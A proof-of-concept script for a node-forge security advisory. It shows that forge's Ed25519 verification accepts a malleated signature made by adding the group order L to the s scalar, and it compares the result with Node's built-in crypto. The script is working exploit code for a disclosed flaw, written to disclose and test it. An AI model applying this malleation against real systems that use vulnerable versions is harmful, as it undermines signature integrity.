#!/usr/bin/env node
'use strict';

// Security Advisory PoC
//
// https://github.com/digitalbazaar/forge/security/advisories/GHSA-q67f-28xg-22rw
//
// This vulnerability was discovered as part of a U.C. Berkeley security
// research project by: Austin Chu, Sohee Kim, and Corban Villa.
//
// Test vectors from this code were added in the ed25519 unit tests.

const path = require('path');
const crypto = require('crypto');
const forge = require('../../lib/index');
const ed = forge.ed25519;

const MESSAGE = Buffer.from('dderpym is the coolest man alive!');

// Ed25519 group order L encoded as 32 bytes, little-endian (RFC 8032).
const ED25519_ORDER_L = Buffer.from([
  0xed, 0xd3, 0xf5, 0x5c, 0x1a, 0x63, 0x12, 0x58,
  0xd6, 0x9c, 0xf7, 0xa2, 0xde, 0xf9, 0xde, 0x14,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10,
]);

// For Ed25519 signatures, s is the last 32 bytes of the 64-byte signature.
// This returns a new signature with s := s + L (mod 2^256), plus the carry.
function addLToS(signature) {
  if (!Buffer.isBuffer(signature) || signature.length !== 64) {
    throw new Error('signature must be a 64-byte Buffer');
  }
  const out = Buffer.from(signature);
  let carry = 0;
  for (let i = 0; i < 32; i++) {
    const idx = 32 + i; // s starts at byte 32 in the 64-byte signature.
    const sum = out[idx] + ED25519_ORDER_L[i] + carry;
    out[idx] = sum & 0xff;
    carry = sum >> 8;
  }
  return { sig: out, carry };
}

function toSpkiPem(publicKeyBytes) {
  if (publicKeyBytes.length !== 32) {
    throw new Error('publicKeyBytes must be 32 bytes');
  }
  // Builds an ASN.1 SubjectPublicKeyInfo for Ed25519 (RFC 8410) and returns PEM.
  const oidEd25519 = Buffer.from([0x06, 0x03, 0x2b, 0x65, 0x70]);
  const algId = Buffer.concat([Buffer.from([0x30, 0x05]), oidEd25519]);
  const bitString = Buffer.concat([Buffer.from([0x03, 0x21, 0x00]), publicKeyBytes]);
  const spki = Buffer.concat([Buffer.from([0x30, 0x2a]), algId, bitString]);
  const b64 = spki.toString('base64').match(/.{1,64}/g).join('\n');
  return `-----BEGIN PUBLIC KEY-----\n${b64}\n-----END PUBLIC KEY-----\n`;
}

function verifyWithCrypto(publicKey, message, signature) {
  try {
    const keyObject = crypto.createPublicKey(toSpkiPem(publicKey));
    const ok = crypto.verify(null, message, keyObject, signature);
    return { ok };
  } catch (error) {
    return { ok: false, error: error.message };
  }
}

function toResult(label, original, tweaked) {
  return {
    [label]: {
      original_valid: original.ok,
      tweaked_valid: tweaked.ok,
    },
  };
}

function main() {
  const kp = ed.generateKeyPair();
  const sig = ed.sign({ message: MESSAGE, privateKey: kp.privateKey });
  const ok = ed.verify({ message: MESSAGE, signature: sig, publicKey: kp.publicKey });
  const tweaked = addLToS(sig);
  const okTweaked = ed.verify({
    message: MESSAGE,
    signature: tweaked.sig,
    publicKey: kp.publicKey,
  });
  const cryptoOriginal = verifyWithCrypto(kp.publicKey, MESSAGE, sig);
  const cryptoTweaked = verifyWithCrypto(kp.publicKey, MESSAGE, tweaked.sig);
  const result = {
    ...toResult('forge', { ok }, { ok: okTweaked }),
    ...toResult('crypto', cryptoOriginal, cryptoTweaked),
  };
  console.log(JSON.stringify(result, null, 2));
  // enable for debugging on to make test vectors
  //console.log({
  //  message: MESSAGE.toString('hex'),
  //  sig: sig.toString('hex'),
  //  sigSplusL: tweaked.sig.toString('hex'),
  //  pk: kp.publicKey.toString('hex')
  //});
}

main();
